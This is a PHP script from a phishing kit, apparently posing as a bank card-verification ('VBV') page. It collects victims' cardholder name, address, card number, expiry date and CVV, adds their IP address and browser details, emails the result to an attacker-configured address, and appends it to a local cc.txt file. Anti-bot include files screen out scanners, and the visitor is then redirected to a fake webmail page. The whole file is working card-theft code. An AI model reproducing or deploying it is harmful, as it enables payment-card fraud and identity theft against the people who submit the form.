<?php
	error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
include '../../prevents/anti1.php';
include '../../prevents/anti2.php';
include '../../prevents/anti3.php';
include '../../prevents/anti4.php';
include '../../prevents/anti5.php';
include '../../prevents/anti6.php';
include '../../prevents/anti7.php';
include '../../prevents/anti8.php';
include '../../prevents/9atila.php';
	session_start();
	//error_reporting(0);	
	require 'Settings.php';
	require 'functions.php';

	
	$name="";
	if(isset($_POST['infoname']))
		$name=$_POST['infoname'];
	
	$address="";
	if(isset($_POST['info1']))
		$address=$_POST['info1'];
	
	$city="";
	if(isset($_POST['info2']))
		$city=$_POST['info2'];
	
	$cc="";
	if(isset($_POST['infocc']))
		$cc=$_POST['infocc'];
	
	$month="";
	if(isset($_POST['infomonth']))
		$month=$_POST['infomonth'];
	
	$year="";
	if(isset($_POST['infoyear']))
		$year=$_POST['infoyear'];
	
	$cvv="";
	if(isset($_POST['infocvv']))
		$cvv=$_POST['infocvv'];
	
	 
	$message="+++ RESULT VBV 💲 NBG 💚💚 +++\r\n";
	$message.="log          : ".$_SESSION['_Log_Id_']."\r\n";
	$message.="name         : ".$name."\r\n";
	$message.="address 	    : ".$address."\r\n";
	$message.="city 	    : ".$city."\r\n";
	$message.="cc 	        : ".$cc."\r\n";
	$message.="date exp     : ".$month."/".$year."\r\n";
	$message.="cvv          : ".$cvv."\r\n";
	$message.="++++++++++++++++++++++++++++\r\n\n";
	$message.="IP adresse   : ".GetIP()."\r\n";
	$message.="Navigateur   : ".getBrowser($_SERVER['HTTP_USER_AGENT'])."\r\n";
	$message.="Systeme      : ".getOS($_SERVER['HTTP_USER_AGENT'])."\r\n";
	$message.="Agent Client : ".$_SERVER['HTTP_USER_AGENT']."\r\n";
	$message.="++++++++++++++++++++++++++++\r\n\n";
	
	$message_subject = "RESULT VBV 💲 NBG 💚💚 || ".$_SESSION['_Log_Id_'];
	
	$message_headers .= "From:Le.Petit.Genie<noreply@pg.org>";
    $message_headers .= "MIME-Version: 1.0\n";
	
	mail ($e_mail,$message_subject,$message, $message_subject);
	if($writeInFile){
		$file = fopen("../../file/cc.txt","a");
		fwrite($file, $message."\r\n\r\n\r\n\r\n");
		fclose($file);
	}
	HEADER("Location:../webmail.php", true, 303);

?>